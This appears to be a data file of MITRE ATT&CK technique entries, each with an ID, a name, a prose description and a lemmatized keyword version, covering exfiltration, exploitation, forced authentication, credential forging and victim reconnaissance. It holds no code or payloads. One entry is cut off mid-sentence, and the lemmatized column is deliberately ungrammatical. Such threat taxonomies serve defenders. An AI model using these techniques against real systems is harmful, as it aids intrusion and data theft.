T1048.001,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",adversary steal datum exfiltrate symmetrically encrypt network protocol exist command control channel datum send alternate network location main command control server symmetric encryption algorithm use share key secret end channel require exchange pre arrange agreement possession value encrypt decrypt datum network protocol use asymmetric encryption utilize symmetric encryption key exchange adversary opt manually share key implement symmetric cryptographic algorithm ex aes vice mechanism bake protocol result multiple layer encryption protocol natively encrypt https encryption protocol typically encrypt http ftp
T1048.002,Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",adversary steal datum exfiltrate asymmetrically encrypt network protocol exist command control channel datum send alternate network location main command control server asymmetric encryption algorithm use different key end channel know public key cryptography require pair cryptographic key encrypt decrypt datum correspond key end communication channel require private key procession entity public key entity public key entity exchange encrypt communication begin network protocol use asymmetric encryption https tls ssl utilize symmetric encryption key exchange adversary opt use encrypt mechanism bake protocol
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",adversary steal datum exfiltrate un encrypted network protocol exist command control channel datum send alternate network location main command control server adversary opt obfuscate data use encryption network protocol natively unencrypted http ftp dns include custom publicly available encoding compression algorithm embed datum protocol header field
T1041,Exfiltration Over C2 Channel,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,adversary steal datum exfiltrate exist command control channel steal data encode normal communication channel protocol command control communication
T1011,Exfiltration Over Other Network Medium,"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",adversary attempt exfiltrate datum different network medium command control channel command control network wired internet connection exfiltration occur example wifi connection modem cellular datum connection bluetooth radio frequency rf channel adversary choose sufficient access proximity connection secure defend primary internet connect channel route enterprise network
T1011.001,Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",adversary attempt exfiltrate datum bluetooth command control channel command control network wired internet connection adversary opt exfiltrate datum bluetooth communication channel adversary choose sufficient access proximity bluetooth connection secure defend primary internet connect channel route enterprise network
T1052,Exfiltration Over Physical Medium,"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",adversary attempt exfiltrate datum physical medium removable drive certain circumstance air gap network compromise exfiltration occur physical medium device introduce user medium external hard drive usb drive cellular phone player removable storage processing device physical medium device final exfiltration point hop disconnected system
T1052.001,Exfiltration Over Physical Medium: Exfiltration over USB,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",adversary attempt exfiltrate datum usb connect physical device certain circumstance air gap network compromise exfiltration occur usb device introduce user usb device final exfiltration point hop disconnected system
T1567,Exfiltration Over Web Service,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",adversary use exist legitimate external web service exfiltrate datum primary command control channel popular web service act exfiltration mechanism significant cover likelihood host network communicate prior compromise firewall rule exist permit traffic service web service provider commonly use ssl tls encryption give adversary add level protection
T1567.001,Exfiltration Over Web Service: Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",adversary exfiltrate datum code repository primary command control channel code repository accessible api ex access api https give adversary additional level protection exfiltration code repository provide significant cover adversary popular service host network
T1567.002,Exfiltration Over Web Service: Exfiltration to Cloud Storage,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",adversary exfiltrate datum cloud storage service primary command control channel cloud storage service allow storage edit retrieval datum remote cloud storage server internet example cloud storage service include dropbox google docs exfiltration cloud storage service provide significant cover adversary host network communicate service
T1567.003,Exfiltration Over Web Service: Exfiltration to Text Storage Sites,"Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as pastebincom, are commonly used by developers to share code and other information. Text storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.Note: This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.",adversary exfiltrate datum text storage site instead primary command control channel text storage site pastebincom commonly developer share code information text storage site host malicious code communication stage capabilities adversary use site exfiltrate collect datum furthermore pay feature encryption option allow adversary conceal store datum securely note distinct exfiltration code repository highlight access code repository api
T1190,Exploit Public-Facing Application,"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets. Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion. If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",adversary attempt exploit weakness internet face host system initially access network weakness system software bug temporary glitch misconfiguration exploit application website web server include database like sql standard service like smb ssh network device administration management protocol like snmp smart install system internet accessible open socket depend flaw exploit involve exploitation defense evasion application host cloud base infrastructure containerize exploit lead compromise underlie instance container allow adversary path access cloud container api exploit container host access escape host advantage weak identity access management policy adversary exploit edge network infrastructure related appliance specifically target device support robust host base defense website database owasp cwe highlight common web base vulnerability
T1203,Exploitation for Client Execution,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:Browser-based ExploitationWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",adversary exploit software vulnerability client application execute code vulnerability exist software unsecure coding practice lead unanticipated behavior adversary advantage certain vulnerability target exploitation purpose arbitrary code execution oftentimes valuable exploit offensive toolkit obtain code execution remote system gain access system user expect file relate application commonly work useful target exploit research development high utility type exist browser base exploitationweb browser common target drive compromise spearphishing link endpoint system compromise normal web browsing certain user target link spearphishing email adversary control site exploit web browser require action user exploit execute office applicationscommon office productivity application microsoft office target phishing malicious file transmit directly attachment link download require user open document file exploit run common party applicationsother application commonly see software deploy target network exploitation application adobe reader flash common enterprise environment routinely target adversary attempt gain access system depend software nature vulnerability exploit browser require user open file instance flash exploit deliver object microsoft office document
T1212,Exploitation for Credential Access,"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",adversary exploit software vulnerability attempt collect credential exploitation software vulnerability occur adversary take advantage programming error program service operate system software kernel execute adversary control code credentialing authentication mechanism target exploitation adversary means gain access useful credential circumvent process gain access system example target kerberos forge kerberos ticket domain user permission exploitation credential access result privilege escalation depend process target credential obtain
T1211,Exploitation for Defense Evasion,"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.",adversary exploit system application vulnerability bypass security feature exploitation software vulnerability occur adversary take advantage programming error program service operate system software kernel execute adversary control code vulnerability exist defensive security software disable circumvent adversary prior knowledge reconnaissance security software exist environment perform check shortly system compromise security software discovery security software likely target directly exploitation example antivirus software target persistent threat group avoid detection
T1068,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",adversary exploit software vulnerability attempt elevate privilege exploitation software vulnerability occur adversary take advantage programming error program service operate system software kernel execute adversary control code security construct permission level hinder access information use certain technique adversary likely need perform privilege escalation include use software exploitation circumvent restriction initially gain access system adversary operate low privileged process prevent access certain resource system vulnerability exist usually operate system component software commonly run high permission exploit gain high level access system enable unprivileged user level permission system root permission depend component vulnerable enable adversary virtualized environment virtual machine container underlying host necessary step adversary compromise endpoint system properly configure limit privilege escalation method adversary bring sign vulnerable driver compromised machine exploit vulnerability execute code kernel mode process refer bring vulnerable driver byovd adversary include vulnerable driver file deliver initial access download compromised system ingress tool transfer lateral tool transfer
T1210,Exploitation of Remote Services,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB Depending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",adversary exploit remote service gain unauthorized access internal system inside network exploitation software vulnerability occur adversary take advantage programming error program service operate system software kernel execute adversary control code common goal post compromise exploitation remote service lateral movement enable access remote system adversary need determine remote system vulnerable state network service discovery discovery method look common vulnerable software deploy network lack certain patch indicate vulnerability security software detect contain remote exploitation server likely high value target lateral movement exploitation endpoint system risk provide advantage access additional resource know vulnerability exist common service smb depend permission level vulnerable remote service adversary achieve exploitation privilege escalation result lateral movement exploitation
T1133,External Remote Services,"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",adversary leverage external face remote service initially access persist network remote service vpn citrix access mechanism allow user connect internal enterprise network resource external location remote service gateway manage connection credential authentication service service windows remote management vnc externally access valid accounts use service requirement obtain credential pharming obtain credential user compromise enterprise network access remote service redundant persistent access mechanism operation access gain expose service require authentication containerized environment include expose docker api kubernetes api server kubelet web application kubernetes dashboard
T1008,Fallback Channels,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,adversary use fallback alternate communication channel primary channel compromised inaccessible order maintain reliable command control avoid data transfer threshold
T1083,File and Directory Discovery,"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate.",adversary enumerate file directory search specific location host network share certain information file system adversary use information file directory discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action command shell utility obtain information example include dir tree ls find locate
T1222,File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.",adversary modify file directory permission attribute evade access control list acls access protect file file directory permission commonly manage acl configure file directory owner user appropriate permission file directory acl implementation vary platform generally explicitly designate user group perform action read write execute include change specific access right require take ownership file directory elevated permission depend file directory exist permission enable malicious activity modify replace delete specific file directory specific file directory modification require step technique establish persistence accessibility features boot logon initialization scripts unix shell configuration modification taint hijack instrumental binary configuration file hijack execution flow adversary change permission symbolic link example malware particularly ransomware modify symbolic link associated setting enable access file local shortcut remote path
T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).Adversaries can interact with the DACLs using built-in Windows commands, such as icacls, cacls, takeown, and attrib, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",adversary modify file directory permission attribute evade access control list acls access protect file file directory permission commonly manage acl configure file directory owner user appropriate permission file directory acl implementation vary platform generally explicitly designate user group perform action read write execute implement file directory acl discretionary access control lists interact dacls build windows command icacls cacls takeown attrib grant adversary high permission specific file folder powershell provide cmdlet retrieve modify file directory dacl specific file directory modification require step technique establish persistence accessibility features boot logon initialization scripts taint hijack instrumental binary configuration file hijack execution flow
T1222.002,File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode).Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",adversary modify file directory permission attribute evade access control list acls access protect file file directory permission commonly manage acl configure file directory owner user appropriate permission file directory acl implementation vary platform generally explicitly designate user group perform action read write execute linux linux base platform provide standard set permission group user group standard set permission read write execute apply group nuance platform permission implementation vary platform provide primary command manipulate file directory acl chown short change owner chmod short change use command owner file directory change mode current permission allow subsequently lock file specific file directory modification required step technique establish persistence unix shell configuration modification taint hijack instrumental binary configuration file hijack execution flow
T1495,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system. Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable. Depending on the device, this attack may also result in Data Destruction.",adversary overwrite corrupt flash memory content system bios firmware device attach system order render inoperable unable boot deny availability use device system firmware software load execute non volatile memory hardware device order initialize manage device functionality device include motherboard hard drive video card general adversary manipulate overwrite corrupt firmware order deny use system device example corruption firmware responsible load operate system network device render network device inoperable depend device attack result data destruction
T1187,Forced Authentication,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. There are several different ways this can occur. Some specifics from in-the-wild use include:A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document can include, for example, a request similar to file A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \",adversary gather credential material invoke force user automatically provide authentication information mechanism intercept server message block smb protocol commonly windows network authentication communication system access resource file sharing windows system attempt connect smb resource automatically attempt authenticate send credential information current user remote system behavior typical enterprise environment user need enter credential access network resource web distributed authoring versioning webdav typically windows system backup protocol smb block fail webdav extension http typically operate tcp port adversary advantage behavior gain access user account hash force smb webdav authentication adversary send attachment user spearphishing contain resource link external server control adversary template injection place specially craft file navigation path privileged account file place desktop publicly accessible share access user system access untrusted resource attempt authentication send information include user hash credential smb adversary control server different way occur specific wild use include spearphishing attachment contain document resource automatically load document open template injection document include example request similar file modify file icon filename point external reference
T1606,Forge Web Credentials,"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.Once forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.",adversary forge credential material gain access web application internet service web application service host cloud saas environment premise server use session cookie token material authenticate authorize user access adversary generate credential material order gain access web resource differ steal web session cookie steal application access token similar behavior credential new forge adversary steal intercept legitimate user generation web credential require secret value password private keys cryptographic seed value forge adversary use web credential access resource ex use alternate authentication material bypass multi factor authentication protection mechanism
T1606.001,Forge Web Credentials: Web Cookies,"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.Adversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.Once forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.",adversary forge web cookie gain access web application internet service web application service host cloud saas environment premise server use session cookie authenticate authorize user access adversary generate cookie order gain access web resource differ steal web session cookie similar behavior cookie new forge adversary steal intercept legitimate user common web application standardize document cookie value generate provide tool interface generation web cookie require secret value password private keys cryptographic seed value forge adversary use web cookie access resource web session cookie bypass multi factor authentication protection mechanism
T1606.002,Forge Web Credentials: SAML Tokens,"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.An adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.",adversary forge saml token permission claim lifetime possess valid saml token signing certificate adversary utilize private keys compromise organization token signing certificate create forge saml token adversary sufficient permission establish new federation trust active directory federation services ad fs server instead generate trust token signing certificate differ steal application access token similar behavior token new forge adversary steal intercept legitimate user adversary gain administrative azure ad privilege saml token forge claim represent highly privileged account lead use alternate authentication material bypass multi factor authentication protection mechanism
T1592,Gather Victim Host Information,"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",adversary gather information victim host targeting information host include variety detail include administrative datum ex assign ip functionality etc specific configuration ex operating system language gather information way direct collection action active scanning phishe information adversary compromise site include malicious content design collect host information visitor information host expose adversary online accessible data set ex social media search victim own websites gather information reveal opportunity form reconnaissance ex search open websites domains search open technical databases establish operational resource ex develop capability obtain capability initial access ex supply chain compromise external remote services
T1592.001,Gather Victim Host Information: Hardware,"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).",adversary gather information victim host hardware targeting information hardware infrastructure include variety detail type version specific host presence additional component indicative add defensive protection ex card biometric reader dedicated encryption hardware gather information way direct collection action active scanning ex hostname server banner user agent string phishing information adversary compromise site include malicious content design collect host information visitor information hardware infrastructure expose adversary online accessible data set ex job posting network map assessment report resume purchase invoice gather information reveal opportunity form reconnaissance ex search open websites domain search open technical database establish operational resource ex develop capability obtain capability initial access ex compromise hardware supply chain hardware addition
T1592.002,Gather Victim Host Information: Software,"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).",adversary gather information victim host software targeting information instal software include variety detail type version specific host presence additional component indicative add defensive protection ex antivirus siem gather information way direct collection action active scanning ex listening port server banner user agent string phishe information adversary compromise site include malicious content design collect host information visitor information instal software expose adversary online accessible datum set ex job posting network map assessment report resume purchase invoice gather information reveal opportunity form reconnaissance ex search open websites domains search open technical databases establish operational resource ex develop capability obtain capability initial access ex supply chain compromise external remote services
T1592.003,Gather Victim Host Information: Firmware,"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or Exploit Public-Facing Application).",adversary gather information victim host firmware targeting information host firmware include variety detail type version specific host infer information host environment ex configuration purpose age patch level gather information way direct elicitation phishing information information host firmware expose adversary online accessible data set ex job posting network map assessment report resume purchase invoice gather information reveal opportunity form reconnaissance ex search open websites domains search open technical databases establish operational resource ex develop capability obtain capability initial access ex supply chain compromise exploit public facing application
